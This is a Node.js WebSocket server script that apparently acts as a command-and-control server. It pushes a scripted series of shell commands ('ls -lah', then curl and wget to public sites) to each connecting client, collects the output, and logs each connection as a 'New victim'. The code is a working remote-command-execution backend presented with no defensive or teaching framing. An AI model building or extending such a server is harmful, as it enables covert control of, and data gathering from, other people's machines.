#!/usr/bin/env node
const http = require("http");
const { server: WebSocketServer } = require("websocket");

const PORT = process.env.PORT || 8080;

const server = http.createServer((request, response) => {
  console.log(new Date() + " Received request for " + request.url);
  response.writeHead(404);
  response.end();
});
server.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});

const wsServer = new WebSocketServer({
  httpServer: server,
  autoAcceptConnections: false
});

wsServer.on("request", request => {
  const connection = request.accept("echo-protocol", request.origin);

  const responses = [
    // {
    //   error: false | string,
    //   stderr: false | string,
    //   stdout: false | string
    // }
  ];
  const lastResponse = () => (responses.length === 0 ? {} : responses[responses.length - 1]);

  function* logic() {
    yield ["ls", ["-lah"]];
    yield ["curl", ["http://google.com"]];
    if (lastResponse().error) {
      yield ["wget", ["-O", "-", "http://google.fr"]];
    }
  }
  const commands = logic();

  const sendNextCommand = () => {
    let cmd = commands.next();
    if (cmd.done) {
      connection.close();
      return;
    }
    connection.sendUTF(JSON.stringify(cmd.value));
  };

  connection.on("message", message => {
    if (message.type !== "utf8") {
      return;
    }
    responses.push(JSON.parse(message.utf8Data));
    sendNextCommand();
  });

  sendNextCommand();
  connection.on("close", () => {
    console.log("============================\n");
    console.log(`New victim connected at address: ${request.remoteAddresses}`);
    console.log(responses);
    console.log("");
  });
});
